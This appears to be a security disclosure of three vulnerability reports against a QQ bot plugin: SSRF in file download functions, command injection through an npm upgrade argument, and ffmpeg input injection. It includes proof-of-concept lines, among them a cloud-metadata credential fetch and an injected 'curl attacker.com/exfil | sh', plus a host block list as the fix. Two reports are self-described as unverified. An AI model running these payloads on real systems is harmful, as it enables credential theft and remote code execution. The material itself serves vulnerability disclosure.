## Report 1: SSRF in downloadFile / downloadFileOnce (CONFIRMED)

**Severity:** Medium
**Status:** Unpatched in v1.7.1

**Description:**
`src/utils/file-utils.ts` (`downloadFileOnce` and `downloadFile`) fetch attacker-controlled URLs with `fetch(url, { redirect: "follow" })` without IP blocklist, hostname allowlist, or SSRF guard. This allows reaching internal services.

**PoC:**
```javascript
await downloadFileOnce("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
```

**Impact:**
- Cloud metadata extraction
- Internal network probing
- SSRF via redirect chains

**Fix:**
Add URL validation before fetch:
```javascript
const BLOCKED_HOSTS = ["localhost", "127.0.0.1", "169.254.169.254", "metadata.google.internal"];
const urlObj = new URL(url);
if (BLOCKED_HOSTS.includes(urlObj.hostname)) throw new Error("SSRF blocked");
```

**Note:** CVE-2026-43526 was filed for the `openclaw/openclaw` core qqbot extension (patched in commit `ddb7a8d`). The `tencent-connect/openclaw-qqbot` plugin (v1.7.1) contains the same vulnerable `downloadFile` pattern and remains unpatched.

## Report 2: Command Injection via npm install (NEEDS VERIFICATION)

**Severity:** Critical (if confirmed)
**Status:** Requires confirmation on current version

**Description:**
The `fireHotUpgrade` command passes a user-controlled `--pkg` argument to `npm install` via shell execution without sanitization. This allows arbitrary command injection.

**Affected file:** `scripts/upgrade-via-npm.sh` or equivalent in `src/index.ts`

**PoC (from original finding):**
```bash
qqbot fireHotUpgrade --pkg="evil-package; curl attacker.com/exfil | sh"
```

**Impact:**
- Remote code execution on the gateway host

**Note:** The current v1.7.1 `upgrade-via-npm.sh` does not expose a `--pkg` parameter directly. The vulnerability may exist in a different code path (e.g., `qqbot_channel_api` feature in v1.6.4+). Requires maintainer review.

## Report 3: FFmpeg Command Injection (NEEDS VERIFICATION)

**Severity:** Medium (if confirmed)
**Status:** Requires confirmation on current version

**Description:**
User-controlled `inputPath` passed to `ffmpeg -i` without path/protocol validation. Protocol prefixes (`http://`, `file://`, `pipe:`, `concat:`) and shell metacharacters allow arbitrary command execution.

**PoC:**
```bash
inputPath = "http://attacker.com/evil.mp4"
ffmpeg -i "http://attacker.com/evil.mp4" ...
```

**Note:** The plugin README states "No ffmpeg required" for voice sending. FFmpeg may be conditionally invoked for video processing. Requires maintainer confirmation.
